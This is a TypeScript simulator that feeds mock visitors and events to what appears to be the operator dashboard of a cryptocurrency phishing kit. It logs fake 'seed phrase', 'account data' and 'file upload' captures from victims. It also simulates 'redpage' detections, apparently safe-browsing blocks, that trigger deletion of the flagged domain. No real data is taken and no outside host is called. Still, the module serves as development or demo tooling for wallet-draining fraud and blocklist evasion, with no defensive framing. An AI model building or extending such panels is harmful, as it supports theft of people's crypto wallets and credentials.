import { serverState, type Visitor } from './state.js';
import { broadcast, broadcastStats } from './websocket.js';

const VISITOR_POOL = [
	{
		ip: '141.98.252.183',
		flag: '\u{1F1EC}\u{1F1E7}',
		city: 'Whitechapel',
		region: 'ENG',
		country: 'United Kingdom',
		device: 'Desktop - Chrome'
	},
	{
		ip: '146.70.172.250',
		flag: '\u{1F1FA}\u{1F1F8}',
		city: 'Los Angeles',
		region: 'CA',
		country: 'United States',
		device: 'Mobile - Safari'
	},
	{
		ip: '185.220.101.42',
		flag: '\u{1F1E9}\u{1F1EA}',
		city: 'Frankfurt',
		region: 'HE',
		country: 'Germany',
		device: 'Desktop - Firefox'
	},
	{
		ip: '103.152.34.78',
		flag: '\u{1F1EF}\u{1F1F5}',
		city: 'Tokyo',
		region: 'TK',
		country: 'Japan',
		device: 'Mobile - Chrome'
	},
	{
		ip: '45.33.94.116',
		flag: '\u{1F1E8}\u{1F1E6}',
		city: 'Toronto',
		region: 'ON',
		country: 'Canada',
		device: 'Desktop - Edge'
	},
	{
		ip: '91.132.147.22',
		flag: '\u{1F1F3}\u{1F1F1}',
		city: 'Amsterdam',
		region: 'NH',
		country: 'Netherlands',
		device: 'Desktop - Chrome'
	},
	{
		ip: '203.0.113.195',
		flag: '\u{1F1E6}\u{1F1FA}',
		city: 'Sydney',
		region: 'NSW',
		country: 'Australia',
		device: 'Mobile - Safari'
	},
	{
		ip: '198.51.100.77',
		flag: '\u{1F1EB}\u{1F1F7}',
		city: 'Paris',
		region: 'IDF',
		country: 'France',
		device: 'Desktop - Firefox'
	}
];

const FLOWS = ['crypto/loading', 'crypto/case', 'crypto/disconnect_default'];

function rand(min: number, max: number): number {
	return Math.floor(Math.random() * (max - min + 1)) + min;
}

function pick<T>(arr: T[]): T {
	return arr[Math.floor(Math.random() * arr.length)];
}

function getAvailableVisitor(): (typeof VISITOR_POOL)[number] | null {
	const connected = new Set(
		[...serverState.visitors.values()].filter((v) => v.status === 'online').map((v) => v.ip)
	);
	const available = VISITOR_POOL.filter((v) => !connected.has(v.ip));
	return available.length > 0 ? pick(available) : null;
}

function getOnlineVisitors(): Visitor[] {
	return [...serverState.visitors.values()].filter((v) => v.status === 'online');
}

function simulateConnect(): void {
	const template = getAvailableVisitor();
	if (!template) return;

	const flow = pick(FLOWS);
	const visitor: Visitor = {
		ip: template.ip,
		flag: template.flag,
		city: template.city,
		region: template.region,
		country: template.country,
		status: 'online',
		flow,
		lastSeen: 'now',
		connectedAt: Date.now(),
		phrases: 0,
		accounts: 0,
		uploads: 0,
		platform: 'crypto',
		device: template.device,
		lastPage: '',
		lastPageRoute: '',
		flowSteps: [],
		inputs: {},
		wallets: [],
		screenSize: '',
		timezone: '',
		browser: '',
		os: '',
		cpuCores: 0,
		email: '',
		module: '',
		userId: '',
		userAgent: '',
		flowBypassed: false,
		capturedBy: '',
		lastTwoDigits: ''
	};

	serverState.addVisitor(visitor);
	const logEntry = serverState.addLogEntry(
		`Visitor ${visitor.ip} connected \u2014 ${flow}`,
		'connect'
	);

	broadcast({ type: 'visitor:connected', payload: visitor });
	broadcast({ type: 'log:new', payload: logEntry });
	broadcastStats();
}

function simulateDisconnect(): void {
	const online = getOnlineVisitors();
	if (online.length === 0) return;

	const visitor = pick(online);
	serverState.removeVisitor(visitor.ip);
	const logEntry = serverState.addLogEntry(
		`Visitor ${visitor.ip} disconnected`,
		'disconnect'
	);

	broadcast({ type: 'visitor:disconnected', payload: { ip: visitor.ip } });
	broadcast({ type: 'log:new', payload: logEntry });
	broadcastStats();
}

function simulateFlowTransition(): void {
	const online = getOnlineVisitors();
	if (online.length === 0) return;

	const visitor = pick(online);
	const otherFlows = FLOWS.filter((f) => f !== visitor.flow);
	const newFlow = pick(otherFlows);
	serverState.pushVisitor(visitor.ip, newFlow);

	const logEntry = serverState.addLogEntry(
		`Visitor ${visitor.ip} connected \u2014 ${newFlow}`,
		'connect'
	);

	broadcast({ type: 'visitor:updated', payload: visitor });
	broadcast({ type: 'log:new', payload: logEntry });
}

function simulateDataHarvest(): void {
	const online = getOnlineVisitors();
	if (online.length === 0) return;

	const visitor = pick(online);
	const harvestType = pick(['accounts', 'phrases', 'uploads'] as const);

	serverState.updateVisitorData(visitor.ip, harvestType);

	let message: string;
	if (harvestType === 'accounts') {
		message = `[crypto] account data from ${visitor.ip} on ${visitor.flow}`;
	} else if (harvestType === 'phrases') {
		message = `[crypto] seed phrase from ${visitor.ip} on ${visitor.flow}`;
	} else {
		message = `[crypto] file upload from ${visitor.ip} on ${visitor.flow}`;
	}

	const logEntry = serverState.addLogEntry(message, 'data');

	broadcast({ type: 'visitor:updated', payload: visitor });
	broadcast({ type: 'log:new', payload: logEntry });
	broadcastStats();
}

function simulateRedpage(): void {
	const activeHosts = serverState.hosts.filter((h) => h.active);
	if (activeHosts.length <= 1) return;

	const host = pick(activeHosts);
	serverState.deleteHost(host.domain);

	const logEntry = serverState.addLogEntry(
		`Redpage detected for ${host.domain}, domain deleted`,
		'alert'
	);

	broadcast({ type: 'host:redpage', payload: { domain: host.domain } });
	broadcast({ type: 'log:new', payload: logEntry });
}

function simulateSettingsUpdate(): void {
	const activeHosts = serverState.hosts.filter((h) => h.active);
	if (activeHosts.length === 0) return;

	const host = pick(activeHosts);
	const logEntry = serverState.addLogEntry(
		`admin updated settings for host ${host.domain}`,
		'action'
	);

	broadcast({ type: 'log:new', payload: logEntry });
}

export function startSimulator(): void {
	// Connect new visitors every 5-15 seconds
	setInterval(() => {
		if (getOnlineVisitors().length < 5) {
			simulateConnect();
		}
	}, rand(5000, 15000));

	// Flow transitions every 8-20 seconds
	setInterval(() => {
		simulateFlowTransition();
	}, rand(8000, 20000));

	// Data harvests every 15-45 seconds
	setInterval(() => {
		simulateDataHarvest();
	}, rand(15000, 45000));

	// Disconnects every 20-60 seconds
	setInterval(() => {
		simulateDisconnect();
	}, rand(20000, 60000));

	// Settings updates every 30-90 seconds
	setInterval(() => {
		simulateSettingsUpdate();
	}, rand(30000, 90000));

	// Redpage events very rarely (every 2-5 minutes)
	setInterval(() => {
		if (Math.random() < 0.3) {
			simulateRedpage();
		}
	}, rand(120000, 300000));

	// Uptime stats refresh every 10 seconds
	setInterval(() => {
		broadcastStats();
	}, 10000);

	// Seed initial visitors after a brief delay
	setTimeout(() => {
		simulateConnect();
		setTimeout(() => simulateConnect(), rand(2000, 5000));
	}, 1500);
}
